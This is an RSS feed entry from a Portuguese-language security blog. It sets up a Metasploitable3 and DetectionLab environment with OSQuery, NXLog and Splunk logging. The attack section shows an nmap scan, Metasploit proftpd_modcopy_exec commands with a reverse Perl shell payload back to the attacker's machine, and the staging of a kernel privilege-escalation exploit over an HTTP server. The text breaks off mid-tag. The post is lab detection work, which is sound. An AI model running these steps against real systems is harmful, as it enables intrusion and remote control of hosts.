<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>Security Stuff Blog</title>
        <link>https://imgodes.github.io/blog</link>
        <description>Security Stuff Blog</description>
        <lastBuildDate>Wed, 26 Apr 2023 18:52:00 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>pt</language>
        <item>
            <title><![CDATA[Metasploitable & DetectionLab]]></title>
            <link>https://imgodes.github.io/blog/2023/04/27/metasploitable-detec/metasploitable3-detectionlab</link>
            <guid>https://imgodes.github.io/blog/2023/04/27/metasploitable-detec/metasploitable3-detectionlab</guid>
            <pubDate>Wed, 26 Apr 2023 18:52:00 GMT</pubDate>
            <description><![CDATA[Adi√ß√£o do Metasploitable3 (com seus logs e telemetrias) ao DetectionLab.]]></description>
            <content:encoded><![CDATA[<p>Adi√ß√£o do <a href="https://github.com/rapid7/metasploitable3" target="_blank" rel="noopener noreferrer">Metasploitable3</a> (com seus logs e telemetrias) ao <a href="https://detectionlab.network/" target="_blank" rel="noopener noreferrer">DetectionLab</a>.</p><p><img loading="lazy" alt="a" src="/assets/images/heros-83b2c6108d57e26cda9496a77795aecd.jpg" width="3072" height="2048" class="img_ev3q"></p><blockquote><p>Observa√ß√£o: esse guia pode ser um pouco dif√≠cil de acompanhar caso n√£o conhe√ßa o Detection Lab, mas basta instala-lo uma vez que tudo ficar√° mais f√°cil de entender.</p></blockquote><h1>√çndice</h1><h1>Introdu√ß√£o</h1><p>O Metasploitable3 √© uma m√°quina com servi√ßos propositalmente vulner√°veis. Existem v√°rias vers√µes dele, eu escolhi a terceira por ser a <a href="https://github.com/rapid7/metasploitable3/wiki#differences-between-metasploitable-3-and-the-older-versions" target="_blank" rel="noopener noreferrer">mais nova</a>.</p><p>J√° o <a href="https://twitter.com/DetectionLab" target="_blank" rel="noopener noreferrer">DetectionLab</a> √© um agrupado de ferramentas de detec√ß√£o e logging, que juntas se tornam um √≥timo ambiente de testes.</p><ul><li><a href="https://twitter.com/DetectionLab" target="_blank" rel="noopener noreferrer">Twitter do DetectionLab</a></li><li><a href="https://github.com/clong" target="_blank" rel="noopener noreferrer">Github do Criador</a></li><li><a href="https://detectionlab.network" target="_blank" rel="noopener noreferrer">Site oficial</a></li></ul><p><img loading="lazy" alt="dttnlab" src="/assets/images/overview-d53e1b77b882058fcbb23e03c0bc245c.png" width="3148" height="2434" class="img_ev3q">
<em>Imagem retirada do site oficial - <a href="https://detectionlab.network" target="_blank" rel="noopener noreferrer">https://detectionlab.network</a></em></p><p><strong>Pontos importantes</strong>:</p><ul><li>O tr√°fego de rede √© loggado pelo Zeek;</li><li>Suricata √© um IDS, um IPS, um NSM e processador de captura de pacotes open source, ele trabalha junto com o Zeek na an√°lise de tr√°fego;</li><li>O Velociraptor e o OSQuery nos apoiam quanto a an√°lise do endpoint e ambos possuem sua pr√≥pria interface web;</li><li>O OSQuery consegue fazer consultas de baixo n√≠vel do SO. <ul><li>Ele exp√µe as informa√ß√µes do SO √° um banco de dados que pode ser consultado por uma interface web chamada Fleet;</li><li>Apesar ter sua pr√≥pria interface web, o OsQuery envia logs dos resultados das consultas (<code>index=osquery</code>) e tamb√©m de status dele mesmo (INFO/WARN/ERROR). </li></ul></li><li>Todos esses logs podem ser consultados no Splunk.</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="combo---metasploitable3--detectionlab">Combo - Metasploitable3 &amp; DetectionLab<a href="#combo---metasploitable3--detectionlab" class="hash-link" aria-label="Link direto para Combo - Metasploitable3 &amp; DetectionLab" title="Link direto para Combo - Metasploitable3 &amp; DetectionLab">‚Äã</a></h2><p>Combinando a capacidade de detec√ß√£o e investiga√ß√£o do Splunk + OSQuery, com os futuros ataques feitos ao servidor vulner√°vel, ganhamos a capacidade de identificar as etapas do ataque. Mas antes de seguir com a pr√°tica, temos que entender como os componentes interagem, que ap√≥s as minhas customiza√ß√µes, passa a funcionar da seguinte forma:
<img loading="lazy" alt="combopng" src="/assets/images/detectionlabmeta3x-bb7bdd513167c3552d02c2090ba7f90d.png" width="2052" height="1641" class="img_ev3q">
<em>Desenho da arquitetura do lab do ponto de vista das funcionalidades</em> </p><p>Observa√ß√µes:</p><ul><li>Configurei o envio dos logs do apache para o Splunk via NXLog (mais detalhes em <a href="#nxlog">NXLog</a>);</li><li>Configurei a coleta de telemetrias pelo OSQuery (mais detalhes em <a href="#osquery-e-fleet">OSQuery e Fleet</a>);</li><li>Instalei uma VM do Kali para efetuar os ataques;</li><li>Desliguei as m√°quinas windows do DetectionLab pois n√£o iam ser usadas;</li><li><em>O agente do Velociraptor ainda n√£o est√° configurado no Metasploitable, portanto seguimos apenas com o OSQuery.</em></li></ul><h1>Setup TLTR - Too lazy to read</h1><p>Se voc√™ estiver com pressa, ou j√° saiba como tudo isso funciona, basta seguir o passos abaixo.</p><blockquote><p>Caso desconhe√ßa as ferramentas acima, recomendo ler um pouco antes de tentar instalar e configurar.
{: .prompt-info}</p></blockquote><h2 class="anchor anchorWithStickyNavbar_LWe7" id="instala√ß√£o">Instala√ß√£o<a href="#instala√ß√£o" class="hash-link" aria-label="Link direto para Instala√ß√£o" title="Link direto para Instala√ß√£o">‚Äã</a></h2><p><strong>Com o detectionlab j√° INSTALADO e funcionando use os comandos abaixo:</strong></p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token function" style="color:rgb(80, 250, 123)">git</span><span class="token plain"> clone https://github.com/imgodes/DetectionLabMetasploitable3.git</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">cd</span><span class="token plain"> DetectionLabMetasploitable3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vagrant up</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Crie um index no Splunk chamado <code>syslog</code>.
Explica√ß√£o detalhada em <a href="#index">index</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="acessos">Acessos<a href="#acessos" class="hash-link" aria-label="Link direto para Acessos" title="Link direto para Acessos">‚Äã</a></h2><ul><li>Fleet login: <a href="https://192.168.56.105:8412" target="_blank" rel="noopener noreferrer">https://192.168.56.105:8412</a> - <a href="mailto:admin@detectionlab.network" target="_blank" rel="noopener noreferrer">admin@detectionlab.network</a>:Fl33tpassword!</li><li>Splunk login: <a href="https://192.168.56.105:8000" target="_blank" rel="noopener noreferrer">https://192.168.56.105:8000</a> - admin:changeme</li><li>Velociraptor login: <a href="https://192.168.56.105:9999" target="_blank" rel="noopener noreferrer">https://192.168.56.105:9999</a> - admin:changeme</li><li>Metasploitable3 em <a href="http://192.168.56.210" target="_blank" rel="noopener noreferrer">http://192.168.56.210</a> - vagrant:vagrant</li></ul><blockquote><p>Agora vamos a apresenta√ß√£o das customiza√ß√µes feitas. Lembrando que √© tudo meramente informativo, afinal, ser√° configurado automaticamente ap√≥s executar <code>vagrant up</code>(exceto a configura√ß√£o do index do Splunk).
{: .prompt-danger}</p></blockquote><h1>Logging</h1><p>O Metasploitable √© somente uma m√°quina vulner√°vel alvo do nosso ataque, ent√£o sozinha, seria dif√≠cil de investigar e identificar a atividade maliciosa. Por essa raz√£o, instalei o OSQuery e o NXLog no Metasploitable. Essas ferramentas v√£o nos das a capacidade: </p><ul><li><strong>OSQuery</strong> üëâ Consultar processos, pastas, arquivos, comandos usados, modifica√ß√µes, sockets de rede e muitas outras informa√ß√µes sobre o sistema operacional em tempo real, por meio de comandos SQL;<ul><li>Pode ser consultado pela interface web do Fleet, ou pelo pr√≥prio OSQuery mesmo (dentro da m√°quina do Metasploitable);</li></ul></li><li><strong>NXLog</strong> üëâ Envio de logs de m√°quina ao Splunk;</li><li><strong>Splunk</strong> üëâ Consulta de logs de maneira centralizada.</li></ul><p><img loading="lazy" alt="detectionlab_simples-logging.drawio.png" src="/assets/images/detectionlab_simples-logging.drawio-f649221797f0a99f1c1b1ec0c087eb43.png" width="614" height="382" class="img_ev3q">
<em>Desenho da arquitetura do lab do ponto de vista do logging</em> </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="osquery-e-fleet">OSQuery e Fleet<a href="#osquery-e-fleet" class="hash-link" aria-label="Link direto para OSQuery e Fleet" title="Link direto para OSQuery e Fleet">‚Äã</a></h2><p>O OSQuery √© uma ferramenta que permite consultar informa√ß√µes do SO. </p><p>J√° o Fleet √© um gerenciador de OSQuery open source, com ele podemos gerenciar e consultar o OSQuery em v√°rios dispositivos por meio de uma interface web.</p><p>Processos, opera√ß√µes de rede, e muitas outras coisas podem ser consultas. Para a alegria do brasileiro m√©dio, existem  muitos "packs de consultas" prontos voltados para identifica√ß√£o de ataques. Esses packs, s√£o queries prontas, basta executa-las. </p><blockquote><p>Exemplos - <a href="https://github.com/osquery/osquery/tree/master/packs" target="_blank" rel="noopener noreferrer">OSQuery packs oficiais</a>, <a href="https://github.com/palantir/osquery-configuration/tree/master" target="_blank" rel="noopener noreferrer">Palantir Packs</a></p></blockquote><ul><li>Os "agentes" do OSQuery s√£o registrados no Fleet.<ul><li>As consultas e configura√ß√µes do agente Osquery s√£o fornecidas pelo Fleet atrav√©s de uma conex√£o TLS.  </li></ul></li><li>A configura√ß√£o do agente √© definida pelo arquivo <code>osquery.flags</code>{: .filepath} </li><li>O nosso Fleet do DetectionLab √© pr√©-configurado com os arquivos do <a href="https://github.com/palantir/osquery-configuration" target="_blank" rel="noopener noreferrer">Palantir</a>. </li><li>As op√ß√µes ativadas no arquivo de <code>osquery.flags</code>{: .filepath} s√£o as do pr√≥prio Palantir, e n√£o alterei nada, apenas peguei do reposit√≥rio deles. </li><li>De acordo com o reposit√≥rio do Palantir, √© esperado que hosts Linux tenham o arquivo <a href="https://github.com/palantir/osquery-configuration/blob/master/Classic/Servers/Linux/packs/ossec-rootkit.conf" target="_blank" rel="noopener noreferrer">ossec-rootkit.conf</a> em <code>/etc/osquery/packs/ossec-rootkit.conf</code>{: .filepath} isso √© garantido pelo vagrant quando executamos <code>vagrant up</code>.</li><li>A op√ß√£o user_events √© desabilitada por padr√£o, pois de acordo com a documenta√ß√£o √© redundante.<blockquote><p>"On Linux, a companion table called user_events is included that provides several authentication-based events. If you are enabling process auditing it should be trivial to also include this table" - <a href="https://osquery.readthedocs.io/en/stable/deployment/process-auditing/" target="_blank" rel="noopener noreferrer">User event auditing with Audit</a></p></blockquote></li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="nxlog">NXLog<a href="#nxlog" class="hash-link" aria-label="Link direto para NXLog" title="Link direto para NXLog">‚Äã</a></h2><p>O NXLog √© minha ferramenta favorita para encaminhamento de logs. NXLog pode processar eventos de milhares de fontes diferentes, funciona em sistemas antigos e novos. √â capaz de processar um volume absurdo de logs (de acordo com a <a href="https://docs.nxlog.co/userguide/intro/about-nxlog.html" target="_blank" rel="noopener noreferrer">documenta√ß√£o</a>). Trabalha bem com diversos protocolos de rede, transporte, e criptografias, al√©m de suportar  tamb√©m de formatos de logs dos mais variados (Syslog, Windows Event Log, JSON, etc). E mesmo que n√£o tenha alguma predefini√ß√£o, ainda √© poss√≠vel fazer o parsing manualmente.</p><p>Ent√£o iremos instalar o NXLog no Metasploitable3, para o parsing inicial, e envio dos logs do apache para o Splunk. A configura√ß√£o do NXLog √© toda centralizada no arquivo <code>nxlog.conf</code>{: .filepath}. </p><ul><li>A minha configura√ß√£o est√° dispon√≠vel no <a href="https://raw.githubusercontent.com/imgodes/DetectionLabMetasploitable3/master/nxlog.conf" target="_blank" rel="noopener noreferrer">github</a>;</li><li>O agente do NXlog usado √© o 2.10 para Ubuntu 14.04 (trusty);</li></ul><p>O agente do NXLog consegue ler alguma entrada (<a href="#nxlog-input">Input</a>), manipula-la (Exec) e enviar para alguma sa√≠da(<a href="#nxlog-output">Output e Route</a>). Essas diretrizes s√£o definidas todas no mesmo arquivo <code>nxlog.conf</code>{: .filepath}.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="nxlog-input">NXLog Input<a href="#nxlog-input" class="hash-link" aria-label="Link direto para NXLog Input" title="Link direto para NXLog Input">‚Äã</a></h3><p>√â a entrada dos logs, nesse caso um arquivo.</p><ul><li>Configurei o NXLog para ler os logs do apache em <code>/var/log/apache2/access.log</code>{: .filepath};</li><li>Fiz uma regex para fazer o parsing dos campos do apache;<ul><li>Essas configura√ß√µes est√£o de acordo com as configura√ß√µes de logging que declarei no arquivo <code>apache2.conf</code>, caso altere, lembre de alterar manter a concord√¢ncia entre eles.</li></ul></li></ul><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">Input</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">apache_access</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Module im_file</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    File        "/var/log/apache2/access.log"</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">Exec</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if $raw_event =~ /(?x)^(\S+)\ \S+\ (\S+)\ \[([^\]]+)\]\ \"(\S+)\ (.+)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                          \ HTTP\/\d\.\d\"\ (\S+)\ (\S+)\ \"([^\"]+)\"</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                          \ \"([^\"]+)\"/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            $Hostname = $1;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            if $2 != '-' $AccountName = $2;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            $EventTime = parsedate($3);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            $HTTPMethod = $4;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            $HTTPURL = $5;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            $HTTPResponseStatus = $6;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            if $7 != '-' $FileSize = $7;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            if $8 != '-' $HTTPReferer = $8;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            if $9 != '-' $HTTPUserAgent = $9;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">Exec</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">Input</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file='/etc/nxlog/nxlog.conf'}</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="nxlog-output">NXLog Output<a href="#nxlog-output" class="hash-link" aria-label="Link direto para NXLog Output" title="Link direto para NXLog Output">‚Äã</a></h3><p>Aqui configuramos o que vem do Input e vai para o Splunk.</p><ul><li>Digo que sa√≠da usar√° a porta <code>514/UDP</code> sendo que o destino ser√° o IP do servidor Splunk;</li><li>Executo a fun√ß√£o <code>drop()</code> para descartar logs cujo o hostname vem como ipv4 de loopback (isso estava floodando o Splunk de eventos);</li><li>Executo a fun√ß√£o <code>to_json()</code> para converter o log para o formato JSON.</li></ul><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">Output</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">syslog_udp</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Module     om_udp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Host       192.168.56.105</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    PORT       514 </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">Exec</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if ($Hostname == '127.0.0.1') drop();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to_json();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">Exec</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">Output</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">Route</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">1</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Path apache_access =&gt; syslog_udp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">Route</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file='/etc/nxlog/nxlog.conf'}</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="splunk">Splunk<a href="#splunk" class="hash-link" aria-label="Link direto para Splunk" title="Link direto para Splunk">‚Äã</a></h2><p>Os logs s√£o enviados ao Splunk por meio do agente do <a href="https://nxlog.co/" target="_blank" rel="noopener noreferrer">NXLog</a> pela porta <code>514/udp</code> e caem no index chamado "syslog". O problema √© que esse index ainda n√£o existe. Teremos que configura-lo na m√£o.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="index">Index<a href="#index" class="hash-link" aria-label="Link direto para Index" title="Link direto para Index">‚Äã</a></h3><p>Para configurar um index configurar um index. Basta clicar em <code>Settings</code> &gt; <code>Indexes</code> &gt; <code>New Index</code></p><p><img loading="lazy" alt="settings" src="/assets/images/splunk-settings-6c5918c81f3b27aac525f5cdeb86916f.png" width="658" height="586" class="img_ev3q">{: width="400" heigth="400"} </p><p>Depois basta colocar o nome e dale:</p><p><img loading="lazy" alt="index" src="/assets/images/splunk-settings-index-e7edfbb2621ef4a7b513ecbef65b41da.png" width="808" height="802" class="img_ev3q">{: width="400" heigth="400"}</p><p>Feito isso seu lab est√° pronto para a maldade.</p><h1>Attack</h1><p>O ataque n√£o foi grande coisa. Meu foco era ver como a o ataque poderia ser observado nos logs a fim de exemplificar como pode ser usado.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="scanning">Scanning<a href="#scanning" class="hash-link" aria-label="Link direto para Scanning" title="Link direto para Scanning">‚Äã</a></h2><p>Um scan simples com nmap para come√ßar.</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">nmap -sV -p- </span><span class="token number">192.168</span><span class="token plain">.56.210</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="Shell Kali"}</p><p><img loading="lazy" alt="nmap" src="/assets/images/nmap1-554281ff45181aac4638277739d51f51.png" width="983" height="384" class="img_ev3q"></p><p>Haviam v√°rios vetores de ataque, fui no primeiro que li na tela rsrs.</p><p>Ao ver a combina√ß√£o do ProFTP + Apache, podemos supor que temos permiss√£o de grava√ß√£o no SITEPATH. Ent√£o, se explorarmos o servi√ßo ProFTPD podemos abusar da permiss√£o no Apache SITEPATH, o que nos permitir√° obter shell reverso. Mas l√≥gico que tudo isso √© autom√°tico rs, eu s√≥ vou aperta um bot√£o. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting">Exploiting<a href="#exploiting" class="hash-link" aria-label="Link direto para Exploiting" title="Link direto para Exploiting">‚Äã</a></h2><p>Usando o <code>msfconsole</code> &gt; <code>search proftp</code> e encontrei o exploit <a href="https://www.exploit-db.com/exploits/37262" target="_blank" rel="noopener noreferrer">modcopy execution</a>.</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">use proftpd_modcopy_exec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> RHOST </span><span class="token number">192.168</span><span class="token plain">.56.210</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> TARGETURI /</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> SITEPATH /var/www/html/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> payload payload/cmd/unix/reverse_perl</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> LHOST </span><span class="token number">192.168</span><span class="token plain">.56.109</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="Shell Kali"}
<img loading="lazy" alt="proftp-exploit.png" src="/assets/images/proftp-exploit-cbacd67f53a807680593449da7a03a24.png" width="946" height="395" class="img_ev3q"></p><p>Agora com acesso ao shell, podemos escalonar privil√©gio.
A hist√≥ria √© mais longa do que isso, mas resumindo, usei um exploit para aquele kernel em espec√≠fico.</p><p>No Kali Linux executei uma busca por aquela vers√£o do kernel no exploitdb, e deixei o c√≥digo malicioso dispon√≠vel para download. </p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">searchsploit linux </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">local</span><span class="token plain"> kernel </span><span class="token number">3.13</span><span class="token plain"> ubuntu </span><span class="token number">14.04</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">searchsploit -m </span><span class="token number">37292</span><span class="token plain">.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">mv</span><span class="token plain"> </span><span class="token number">37292</span><span class="token plain">.c /tmp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python3 -m http.server </span><span class="token number">80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file="Shell Kali"}</p><p><img loading="lazy" alt="searchsploit.png" src="/assets/images/searchsploit-446565c82ac1b2043acd838e7f2bd46b.png" 